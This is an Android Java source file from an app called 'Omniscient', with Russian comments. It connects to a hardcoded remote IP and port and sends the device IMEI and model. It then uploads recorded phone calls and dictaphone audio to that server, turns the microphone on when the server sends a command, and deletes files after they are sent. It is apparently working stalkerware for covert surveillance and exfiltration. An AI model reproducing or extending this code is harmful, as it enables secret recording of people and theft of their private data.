package com.postal.omniscient.postal.downloadFiles;

import android.content.Context;
import android.content.Intent;

import android.telephony.TelephonyManager;
import android.util.Log;

import com.postal.omniscient.postal.ThreadIsAliveOrNot;
import com.postal.omniscient.postal.adapter.AdapterDownloadFlag;
import com.postal.omniscient.postal.adapter.EventBusData;

import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;
import org.greenrobot.eventbus.ThreadMode;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

import java.net.InetSocketAddress;
import java.net.Socket;

/**
 * Created by Alexandr on 01.07.2016.
 *
 * Загружаем файл на сервер
 */
public class DownloadFileRun extends Thread {
    private Socket socket;
    private DataOutputStream dos;
    private String Msg = "MyMsg";
    private File[] allFoldersFiles = null;
    private Context context;
    private Intent intent;
    private BufferedReader reader;
    private AdapterDownloadFlag is_downloadFlag;


    public DownloadFileRun(File[] allFoldersFiles, Context context, Intent intent) {
        this.allFoldersFiles = allFoldersFiles;
        this.context = context;
        this.intent = intent;
    }
    //шлем файлы из папок на сервер
    public void start() {
        Log.e(Msg, "DownloadFileRun ");
        is_downloadFlag = new AdapterDownloadFlag();
        String server = "185.65.244.125";
        int port = 30036;

        String isLoaded = "isLoaded ";
        try {
            EventBus.getDefault().register(this);
            socket = new Socket();//(server, port);
            socket.connect(new InetSocketAddress(server, port),2000);
            socket.setSoTimeout(25000);
            dos = new DataOutputStream(new BufferedOutputStream(socket.getOutputStream()));
            oaut();

            try {
                reader = new BufferedReader(
                        new InputStreamReader(socket.getInputStream()));
                String line;

                is_downloadFlag.setTreadIsWork(false);
                boolean is_KeepConnectionFlag = true;


                while ((line = reader.readLine()) != null) {


                    //Log.d(Msg, "ANSWER " + line);
                    if (line.startsWith(isLoaded)) {// сделать в оддельном потоке, что бы прием-передача
                        //были в разных потоках
                        DeleteSendOutFiles deleteSendOutFiles = new DeleteSendOutFiles(context);
                        deleteSendOutFiles.setFeleNAme(line);
                        Thread startDelete = new Thread(deleteSendOutFiles);
                        //поток для удаления файлов
                        startDelete.start();
                    }

                    if (line.equals("isConnect") && !is_downloadFlag.getTreadIsWork()
                            && is_KeepConnectionFlag) {
                            //Log.e(Msg, "IS COON"+"\n");

                        //если поток передачи даннных запущен не поддерживать свъязь с сервером
                        KeepConnection keep_con = new KeepConnection(dos, is_downloadFlag,
                                is_KeepConnectionFlag, context);
                        keep_con.setName("KeepConnection");
                        keep_con.start();

                        //Log.e(Msg, "Название потока поддержки свъязи с сервером "+ keep_con.getName().toString());
                    }

                    if (line.equals("ok")) {
                        //начать поддержку соединения
                        if (allFoldersFiles != null) {
                            //отправка в новом потоке
                            SendFileToServer dwnloadFile = new SendFileToServer(allFoldersFiles,
                                    socket, dos, is_downloadFlag);
                            Thread startDownlow = new Thread(dwnloadFile);
                            //поток для загрузки файлов на сервер
                            startDownlow.start();
                        }
                    }
                    //команда на включение диктофона
                    if (line.equals("dictaphone")) {
                        if (!new ThreadIsAliveOrNot("DictaphoneRecordStop").liveORnot()) {
                            Dictaphone dict = new Dictaphone(is_downloadFlag, context);
                            dict.setName("DictaphoneRec");
                            dict.start();
                            //Log.i(Msg, "  ДИКТОФОН ВКЛЮЧЕН");
                            dos.writeUTF("dictaphone_on");
                            dos.flush();
                        }
                    }

                }
            } catch (IOException ex) { Log.e(Msg, "Eror DownloadFileRun run"+ex);
                sockClose();EventBus.getDefault().unregister(this);
            }
        } catch (IOException e) {
            try{
                socket.close();
                EventBus.getDefault().unregister(this);
            }catch (Exception ke){
                Log.e(Msg, "Eror4  DownloadFileRun run "+ke);}//reader и dos бют NullPointerException их не нужно закрывать - они пусты
            Log.e(Msg, "Eror2 DownloadFileRun run "+e);
        }
    }

    private void sockClose(){
        try {
            reader.close();socket.close();dos.close();

        } catch (IOException e) {
            Log.e(Msg, "Eror3 DownloadFileRun sockClose"+e);
        }

    }

    //слушаем когда диктофон или звонок запишется и отправляем запись на сервер
    @Subscribe(threadMode = ThreadMode.ASYNC)
    //Загружаем файл после  записи звонка или диктофона
    public void onEvent(EventBusData event){
        try {
            String command = event.getComand();

            if (command.equals("call_off")) {
                is_downloadFlag.setPhoneRecIsWork(false);
                if (!is_downloadFlag.getTreadIsWork() && !is_downloadFlag.getPhoneRecIsWork()) {
                    SendFilesOutOfTurn();
                }
            }
            if (command.equals("dictaphone_off")) {
                is_downloadFlag.setDictaphoneIsWork(false);
                if (!is_downloadFlag.getTreadIsWork() && !is_downloadFlag.getDictaphoneIsWork()) {
                    SendFilesOutOfTurn();
                }
            }
        }catch (Exception e){Log.i(Msg, "Error DownloadFileRun onEvent "+e);}
    }
    //загрузка файлов на сервер
    private void SendFilesOutOfTurn(){
        try {
            allFoldersFiles = getAllFoldersFiles(context);
            if (allFoldersFiles != null) {
                //отправка в новом потоке
                SendFileToServer downloadFile = new SendFileToServer(allFoldersFiles,
                        socket, dos, is_downloadFlag);
                Thread startDownlow = new Thread(downloadFile);
                //поток для загрузки файлов на сервер
                startDownlow.start();
            }
        }catch (Exception e){Log.e(Msg, "Exept 5 SendFilesOutOfTurn "+e.toString());}
    }
    /**  получаем пути к файлам для отправки на сервер     */
    private  File[] getAllFoldersFiles (Context context){
        File path; //путь к папке программы
        File f; //путь к папке где сохраняются все файлы для отправки на сервер
        File[] files_all = null; //массив папок в которых храняться файлы для отправки
        //записать в массив и передать на отправку
        try {
            path = context.getFilesDir();
            f = new File(String.valueOf(path + "/Omniscient"));
            files_all = f.listFiles();
        }catch (Exception e){Log.i(Msg, "Error DownloadFileRun onEvent "+e);}
        return files_all;
    }

    //авторизация на сервере для отправки файлов (создание запросса на авторизацию)
    public void oaut() {
        try {
        TelephonyManager telephonyManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
        String imei = telephonyManager.getDeviceId();
        String PhoneModel = android.os.Build.MODEL;

            JSONObject aouth = new JSONObject();//Заголовок
            JSONObject log_pass = new JSONObject();
            String user = readFromFile(context);
            aouth.put("Login", user);
            aouth.put("Imei", imei);
            aouth.put("Id_user", user);
            aouth.put("P_name", PhoneModel);
            aouth.put("Command", "no");
            aouth.put("NameToSend", "no");
            log_pass.put("Aouth", aouth);

            dos.writeUTF(log_pass.toString());
            dos.flush();

        } catch (IOException e) {
            // TODO Auto-generated catch block
            Log.i(Msg, "Error DownloadFileRun oaut "+e);
        } catch (JSONException e) {
            Log.i(Msg, "Error DownloadFileRun oaut JSONException "+e);
        }
    }
    //читаем id пользователя с айла настроек
    private String readFromFile(Context context) {
        String ret = "";

        try {
            InputStream inputStream = context.openFileInput("config.cnf");

            if ( inputStream != null ) {
                InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
                BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
                String receiveString = "";
                StringBuilder stringBuilder = new StringBuilder();

                while ( (receiveString = bufferedReader.readLine()) != null ) {
                    stringBuilder.append(receiveString);
                }

                inputStream.close();
                ret = stringBuilder.toString();
            }
        }
        catch (FileNotFoundException e) {
            Log.e("login activity", "File not found: " + e.toString());
        } catch (IOException e) {
            Log.e("login activity", "Can not read file: " + e.toString());
        }

        return ret;
    }

    @Override
    public void run() {

        try {
            start();
        }catch (Exception e){ Log.i(Msg, "Error DownloadFileRun run "+e);}
    }


}
